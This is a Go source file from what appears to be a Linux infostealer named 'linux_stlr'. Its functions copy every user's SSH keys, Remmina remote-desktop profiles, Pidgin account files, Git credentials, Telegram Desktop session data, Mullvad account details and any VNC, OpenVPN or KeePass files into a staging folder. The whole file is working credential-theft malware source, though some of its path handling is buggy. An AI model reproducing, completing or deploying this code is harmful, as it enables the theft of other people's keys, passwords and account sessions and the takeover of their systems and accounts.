package applicationfiles

import (
	"linux_stlr/modules/system"
	"linux_stlr/utils/fileutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func Run(destinationdir string) {
	SSHfolder(destinationdir)
	Remmina(destinationdir)
	Pidgin(destinationdir)
	Mullvad(destinationdir)
	Git(destinationdir)
	Telegram(destinationdir)

	AppSpecificExtensions(destinationdir, map[string]string{
		"vnc":     ".vnc",
		"openvpn": ".ovpn",
		"keepass": ".kdbx",
	})
}

func SSHfolder(destinationdir string) {
	found := 0
	users, _ := system.GetUsers()
	for _, user := range users {
		sshfolder := filepath.Join("/home", user, ".ssh")
		if fileutil.IsDir(sshfolder) {
			dst := filepath.Join(destinationdir, user, "ssh")
			err := os.MkdirAll(dst, 0777)
			if err != nil {
				continue
			}
			err = fileutil.CopyDir(sshfolder, dst)
			if err != nil {
				continue
			}
			found++
		}
	}
	if found == 0 {
		return
	}
}

func Remmina(destinationdir string) {
	found := 0
	users, _ := system.GetUsers()
	for _, user := range users {
		profiledir := filepath.Join(user, ".local/share/remmina")
		pref := filepath.Join(user, ".config/remmina/remmina.pref")
		if fileutil.IsDir(profiledir) && fileutil.Exists(pref) {
			dst := filepath.Join(destinationdir, user, "remmina")
			err := os.MkdirAll(dst, 0777)
			if err != nil {
				continue
			}
			err = fileutil.CopyDir(profiledir, dst)
			if err != nil {
				continue
			}
			err = fileutil.CopyFile(pref, dst)
			if err != nil {
				continue
			}
			found++
		}
	}
}

func Pidgin(destinationdir string) {
	users, _ := system.GetUsers()
	for _, user := range users {
		b, err := os.ReadFile(filepath.Join(user, ".purple/accounts.xml"))
		if err != nil {
			continue
		}
		dst := filepath.Join(destinationdir, user, "pidgin")
		os.MkdirAll(dst, os.FileMode(0777))
		os.WriteFile(filepath.Join(dst, "accounts.xml"), b, os.FileMode(0666))
	}
}

func Mullvad(destinationdir string) error {
	cmd := exec.Command("mullvad", "account", "get")

	out, err := cmd.Output()
	if err != nil {
		return err
	}
	if strings.Contains(string(out), "Not logged in to any account") {
		return nil
	}
	return os.WriteFile(filepath.Join(destinationdir, "mullvad.txt"), out, os.FileMode(0666))
}

func Git(destinationdir string) error {
	users, _ := system.GetUsers()
	for _, user := range users {
		credentialpath := filepath.Join(user, ".git-credentials")
		if b, err := os.ReadFile(credentialpath); err == nil {
			os.WriteFile(filepath.Join(destinationdir, user, "git"), b, os.FileMode(0666))
		}
	}
	return nil
}

func Telegram(destinationdir string) error {
	sessionfile := func(filename string) bool {
		filename = strings.ToLower(filename)
		if filename == "key_datas" {
			return true
		}
		for i := 0; i < len(filename); i++ {
			if (filename[i] < 48 || filename[i] > 57) && (filename[i] < 97 || filename[i] > 102) && i != len(filename)-1 {
				return false
			}
		}
		return true
	}

	users, _ := system.GetUsers()
	for _, user := range users {
		tdatapath := filepath.Join(user, "/.local/share/TelegramDesktop/tdata")
		files, err := os.ReadDir(tdatapath)
		if err != nil {
			return err
		}
		dst := filepath.Join(destinationdir, user, "telegram")
		os.MkdirAll(dst, os.FileMode(0777))
		for _, file := range files {
			if sessionfile(file.Name()) {
				if !file.IsDir() {
					if err = fileutil.Copy(filepath.Join(tdatapath, file.Name()), filepath.Join(dst, file.Name())); err != nil {
						return err
					}
				} else {
					os.Mkdir(filepath.Join(dst, file.Name()), 0770)
					if err = fileutil.CopyDir(filepath.Join(tdatapath, file.Name()), filepath.Join(dst, file.Name())); err != nil {
						return err
					}
				}
			}
		}
	}
	return nil
}

func AppSpecificExtensions(destinationdir string, exentions map[string]string) error {
	users, _ := system.GetUsers()
	for _, user := range users {
		filepath.Walk(user, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				return nil
			}
			if info.Size() > 2*1024*1024 {
				return nil
			}
			for app, ex := range exentions {
				if strings.Contains(info.Name(), ex) {
					dst := filepath.Join(destinationdir, user, app, info.Name())
					os.MkdirAll(dst, os.FileMode(0777))
					b, err := os.ReadFile(info.Name())
					if err != nil {
						continue
					}
					os.WriteFile(dst, b, os.FileMode(0666))
				}
			}
			return nil
		})
	}
	return nil
}
